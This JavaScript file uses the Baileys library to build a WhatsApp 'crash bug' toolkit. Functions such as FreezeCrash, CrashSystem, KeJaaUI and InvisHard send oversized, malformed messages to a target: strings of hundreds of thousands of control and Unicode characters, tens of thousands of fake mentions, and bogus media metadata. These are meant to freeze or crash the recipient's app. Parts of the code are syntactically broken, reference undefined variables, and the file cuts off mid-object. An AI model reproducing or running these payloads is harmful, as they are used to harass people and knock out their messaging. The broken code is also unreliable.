const {
default: makeWASocket, 
prepareWAMessageMedia, 
removeAuthState,
useMultiFileAuthState, 
DisconnectReason, 
fetchLatestBaileysVersion, 
makeInMemoryStore, 
generateWAMessageFromContent, 
generateWAMessageContent, 
generateWAMessage,
jidDecode, 
proto, 
delay,
relayWAMessage, 
getContentType, 
generateMessageTag,
getAggregateVotesInPollMessage, 
downloadContentFromMessage, 
fetchLatestWaWebVersion, 
InteractiveMessage, 
makeCacheableSignalKeyStore, 
Browsers, 
generateForwardMessageContent, 
MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');

async function TrazPrivate(target, mention) {
const Traz = [
{ attrs: { biz_bot: '1' }, tag: "meta" },
{ attrs: {}, tag: "mentioned_users" },
];

const delaymention = Array.from({ length: 30000 }, (_, r) => ({
title: "᭡꧈".repeat(95000) + "᭯馃".repeat(95000),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const quotedMessage = {
extendedTextMessage: {
text: "᭯馃И谭鈨搬彂汀蜏饾" + "ꦽꦽ".repeat(12000),
matchedText: "https://" + "ꦾ".repeat(500) + ".com",
canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
description: "\u0003".repeat(500),
title: "\u200D".repeat(1000),
previewType: "NONE",
jpegThumbnail: Buffer.alloc(10000),
contextInfo: {
forwardingScore: 999,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: "Klear Is Here 🪡",
body: "\u0003".repeat(10000),
thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
mediaType: 1,
renderLargerThumbnail: true,
sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
},
mentionedJid: Array.from({ length: 1000 }, (_, i) =>
`${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
}
},
paymentInviteMessage: {
currencyCodeIso4217: "USD",
amount1000: "999999999",
expiryTimestamp: "9999999999",
inviteMessage: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧" + "👾".repeat(1770) + "᭯馃И谭鈨搬彂".repeat(1280),
serviceType: 1
}
};

const Folware = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: { messageSecret: crypto.randomBytes(32) },
interactiveResponseMessage: {
body: { text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧", format: "DEFAULT" },
nativeFlowResponseMessage: {
name: "TrazDellay",
paramsJson: "\u0003".repeat(999999),
version: 3
},
contextInfo: {
isForwarded: true,
forwardingScore: 9741,
forwardedNewsletterMessageInfo: {
newsletterName: "{ Kipop.Cloud }",
newsletterJid: "120363321780343299@newsletter",
serverMessageId: 1
}
}
}
}
}
});

const message = {
viewOnceMessage: {
message: {
stickerMessage: {
url: "https://mmg.whatsapp.net/...",
fileSha256: "xUfV...",
fileEncSha256: "zTi/...",
mediaKey: "nHJv...",
mimetype: "image/webp",
directPath: "/v/t62...",
fileLength: { low: 1, high: 0, unsigned: true },
mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
firstFrameLength: 19904,
firstFrameSidecar: "KN4kQ5pyABRAgA==",
isAnimated: true,
contextInfo: {
mentionedJid: [
"13135550002@s.whatsapp.net",
"@s.whatsapp.net",
"status@broadcast",
...Array.from({ length: 40000 }, () =>
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
],
groupMentions: [],
entryPointConversionSource: "non_contact",
entryPointConversionApp: "whatsapp",
entryPointConversionDelaySeconds: 467593
},
stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
isAvatar: false,
isAiSticker: false,
isLottie: false
}
}
}
};

const buttonsMessage = {
text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧".repeat(15000),
contentText: "\u0003",
footerText: "\u0003",
buttons: [
{
name: "single_select",
buttonParamsJson: "\u0003\u0003"
},
{
buttonId: "\u0003".repeat(911000),
buttonText: { displayText: "\u0003".repeat(400001) },
type: 1,
headerType: 1
},
{
text: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
contentText: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
footerText: "Klear Is Here 🪡",
buttons: [{
buttonId: "{ Kipop.Cloud }",
buttonText: {
displayText: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧" + "ꦽ".repeat(3568) + "\u0003".repeat(500000),
},
type: 1
}],
headerType: 1
}
]
};

const mentionedList = [
"13135550002@s.whatsapp.net",
"@s.whatsapp.net",
"status@broadcast",
...Array.from({ length: 30000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
];

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "👾" },
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () =>
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
fromMe: false,
participant: "@s.whatsapp.net",
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 1,
newsletterName: "{ Kipop.Cloud }"
}
},
description: "⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const TrazDellay = {
viewOnceMessage: {
message: {
extendedTextMessage: {
text: "'⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧",
previewType: "Klear Is Here 🪡",
contextInfo: {
mentionedJid: [
target,
"0@s.whatsapp.net",
...Array.from(
{ length: 30000 },
() => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
],
forwardingScore: 1,
isForwarded: true,
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
},
},
},
},
};


const embeddedMusic = {
musicContentMediaId: "589608164114571",
songId: "870166291800508",
author: "{ Kipop.Cloud }" + "ោ៝".repeat(10000),
title: "PhynixAgency",
artworkDirectPath: "...",
artworkSha256: "...",
artworkEncSha256: "...",
artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
countryBlocklist: true,
isExplicit: true,
artworkMediaKey: "..."
};

const videoMessage = {
url: "...",
mimetype: "video/mp4",
fileSha256: "...",
fileLength: "109951162777600",
seconds: 999999,
mediaKey: "...",
caption: "ꦾ".repeat(12777),
height: 640,
width: 640,
fileEncSha256: "...",
directPath: "...",
mediaKeyTimestamp: "1743848703",
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `⏤̤̮̤̮̤̮̤̮͟͟͞͞T̤̮r̤̮a̤̮z̤̮C̤̮o̤̮m̤̮ṳ̮n̤̮i̤̮t̤  ⃟ y⚠️✧`,
body: `${"\u0003".repeat(9117)}`,
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: null,
sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
},
businessMessageForwardInfo: {
businessOwnerJid: target,
},
quotedMessage,
isSampled: true,
mentionedJid: mentionedList,
groupMentions: [],
entryPointConversionSource: "non_contact",
entryPointConversionApp: "whatsapp",
entryPointConversionDelaySeconds: 467593,
stickerMetadata: {
url: "...",
fileSha256: "...",
fileEncSha256: "...",
mediaKey: "...",
isAnimated: true
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
forwardingScore: 9741,
isForwarded: true,
serverMessageId: 1,
newsletterName: `${"ꦾ".repeat(100)}`
},
streamingSidecar: "...",
thumbnailDirectPath: "...",
thumbnailSha256: "...",
thumbnailEncSha256: "...",
annotations: [
{
embeddedContent: {
embeddedMusic,
stickerMessage: {
firstFrameLength: 19904,
firstFrameSidecar: "KN4kQ5pyABRAgA==",
stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
isAvatar: false,
isAiSticker: false,
isLottie: false
}
},
embeddedAction: true
}
]
};

const msg = generateWAMessageFromContent(
target,
message,
Folware,
TrazDellay,
delaymention,
Traz,
MSG,
quotedMessage,
mentionedList,
{}
);

// Relay to broadcast status
await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target } }
]
}
]
}
]
});

if (mention) {
await sock.relayMessage(target, {
StatusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
type: 25
}
}
}
}, {
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "Fuck_You_Mark" }
}
]
});
}

async function FreezeCrash(target) {
for (let i = 0; i < 10; i++) {
let push = [];
let buttt = [];

for (let i = 0; i < 10; i++) {
buttt.push({
"name": "galaxy_message",
"buttonParamsJson": JSON.stringify({
"header": "\u0000".repeat(10000),
"body": "\u0000".repeat(10000),
"flow_action": "navigate",
"flow_action_payload": { screen: "FORM_SCREEN" },
"flow_cta": "Grattler",
"flow_id": "1169834181134583",
"flow_message_version": "3",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
})
});
}

for (let i = 0; i < 10; i++) {
push.push({
"body": {
"text": "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁" + "軎?".repeat(11000)
},
"footer": {
"text": "dont panic!!"
},
"header": {
"title": '饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁' + "\u0000".repeat(50000),
"hasMediaAttachment": true,
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
"fileLength": "591",
"height": 0,
"width": 0,
"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
"fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
"directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1721344123",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
"scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
"scanLengths": [
247,
201,
73,
63
],
"midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
}
},
"nativeFlowMessage": {
"buttons": []
}
});
}

const carousel = generateWAMessageFromContent(target, {
"viewOnceMessage": {
"message": {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
"interactiveMessage": {
"body": {
"text": "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁 " + "軎?".repeat(55000)
},
"footer": {
"text": "( 馃崄 ) 饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁 ( 馃崄 )"
},
"header": {
"hasMediaAttachment": false
},
"carouselMessage": {
"cards": [
...push
]
}
}
}
}
}, {});

await sock.relayMessage(target, carousel.message, {
messageId: carousel.key.id
});
console.log("Sending Feeze Crash !!");
}
}

async function CrashSystem(target, Ptcp = true) {
await sock.relayMessage(target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
mentionedJid: [target, "13135550002@s.whatsapp.net"],
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
contactVcard: true,
jpegThumbnail: "./public/CrlSql.png",
},
hasMediaAttachment: true,
},
body: {
text: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁踏\n" + "軎?".repeat(45000) + "@0".repeat(17000),
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: "{ display_text: '饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁', url: \"https://t.me/sockModss\", merchant_url: \"https://t.me/sockModss\" }",
},
{
name: "call_permission_request",
buttonParamsJson: "{}",
},
],
messageParamsJson: "{}",
},
contextInfo: {
mentionedJid: ["0@s.whatsapp.net", ...Array.from({
length: 30000
}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
forwardingScore: 1,
isForwarded: true,
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
fileName: "饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁",
fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1724474503",
contactVcard: true,
thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
jpegThumbnail: "./public/CrlSql.png",
},
},
},
},
},
},
},
Ptcp ? {
participant: {
jid: target
}
} : {}
);
console.log(chalk.green("饾悞廷饾悢汀饾悘廷饾悇汀饾悜 饾悜汀饾悁廷饾悏汀饾悁"));
};

async function KeJaaUI(target) {
const BOM_TEKS = "꧄".repeat(200000) + 
 "ꦾꦾ".repeat(150000) + 
 "𒄆".repeat(100000) + 
 "\u0000".repeat(50000);

const msg = await generateWAMessageFromContent(
target,
proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "°‌‌•⃟‌𝗦𝗢𝗟𝗩𝗘𝗙𝗢𝗥𝗖𝗘‌𝐀⿻‌‌‌‌‌‌‌‌‏⭑\n".repeat(20),
locationMessage: {
degreesLatitude: -999.99999999999999,
degreesLongitude: 999.99999999999999,
jpegThumbnail: "./public/CrlSql.png",
Buffer.alloc(9999999) // 9.9MB dummy
},
hasMediaAttachment: true
},
body: { text: BOM_TEKS },
nativeFlowMessage: {
messageParamsJson: "\u0000".repeat(99999) + 
"💣".repeat(50000)
},
carouselMessage: {
cards: [{
title: "°‌‌•⃟‌𝗦𝗢𝗟𝗩𝗘𝗙𝗢𝗥𝗖𝗘‌𝐀⿻‌‌‌‌‌‌‌‌‏⭑",
description: "KepalaLuPecah!",
mediaMessage: {
imageMessage: {
url: "https://nuke.com/ultra.jpg",
mimetype: "image/jpeg",
fileLength: "9999999999"
}
}
}]
}
}
}
}
}), 
{ userJid: target }
);

const blast = [];
for (let i = 0; i < 5; i++) {
blast.push(
sock.relayMessage(target, msg.message, {
messageId: msg.key.id + `-GACOR${Date.now()}-${i}`
})
);
}

await Promise.all(blast);
console.log("Function KeJaaUI Meledak" + target);
}

async function PayloadV2(target, Ptcp = true) {
await sock.relayMessage(target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
Раджаксирин name: "single_select",
Раджаксирин businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
businessOwnerJid: Array.from({ length: 9 }, () => "status@business"),
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
groupMentions: [
{
buttonParamsJson: "status@business", 
targetSubjrct: "call_galaxy",
groupMetadata: {
creationTimestamp: 1715880173,
ownerJid: "owner@newsletter",
adminJids: ["admin@newsletter", "developer@newsletter"], 
}
}
],
externalContextInfo: {
customTag: "SECURE_PAYBUG_MESSAGE",
securityLevel: "HIGH",
referenceCode: "PAYBUG10291",
timestamp: new Date().toISOString(),
messageId: "MSG00123456789",
userId: "call_galaxy"
},
businessOwnerJid: Array.from({ length: 9 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 8 }, () => "8@newsletter"),
groupMentions: [{ buttonParamsJson: "8@newsletter", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 7 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 6 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 4 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 3 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 2 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 1 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }]
},
contextInfo: {
businessOwnerJid: Array.from({ length: 5 }, () => "status@business"),
groupMentions: [{ buttonParamsJson: "status@business", targetSubjrct: "call_galaxy" }],
isForwarded: true,
quotedMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "999999999999",
pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
fileName: "漏 潭饾惄虒饾悽饾惄探谈饾惄潭虤饾惄虁",
fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1724474503",
contactVcard: true,
thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
jpegThumbnail: "./public/CrlSql.png",
}
}
}
}
}
}
};

sock.relayMessage(target, businessMessage, { msg.key.id: { target, Ptcp = true } }, { messageId: null });
}

async function InvisHard(target, mention = false, delayMs = 500) {
for (const targett of target) {
const generateMessage = {
viewOnceMessage: {
message: {
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
caption: "? ???????-?",
fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
fileLength: "19769",
height: 354,
width: 783,
mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
mediaKeyTimestamp: "1743225419",
jpegThumbnail: "./public/CrlSql.png",
scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
scanLengths: [2437, 17332],
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
isSampled: true,
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true
}
}
}
}
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await Ja.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Ja.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "Nab" },
content: undefined
}
]
}
);
}

await new Promise(res => setTimeout(res, delayMs));
}
}

async function FreezeFileInvis(target, Ptcp = true) {
let anjays = "slayer" + "ြ".repeat(25000) + "@1".repeat(60000);
await sock.relayMessage(target, {
message: {
ViewOnceMessage: {
message: {
documentMessage: {
url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
fileLength: "999999999",
pageCount: 0x9184e729fff,
mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
fileName: "NtahMengapa..",
fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
mediaKeyTimestamp: "1715880173",
contactVcard: true
},
title: "bapakkau",
hasMediaAttachment: true
},
body: {
text: anjays
},
nativeFlowMessage: {},
contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "status@broadcast")
}
}
}
}, { participant: { jid: mentionedJid, target } }, { messageId: null });
}

async function MessageSQL(jid) {
const cards = [];

const media = await prepareWAMessageMedia(
{ video: { url: 'https://files.catbox.moe/dfb42j.mp4' }, 
},
{ upload: frmn.waUploadToServer }
);

const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "🥶 𝐕𝐄𝐑𝐒𝐄𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 🥶",
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "",
body: "",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://t.me/VerseNotDev",
showAdAttribution: false // trigger 1
}
}
}
}
}
};

for (let i = 0; i < 10; i++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000) // trigger 2
}
});
}

const msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "🔥 𝐕𝐄𝐑𝐒𝐄𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 🔥"
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "" + "" + Math.floor(Math.random() * 99999), // trigger 3
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
externalAdReply: {
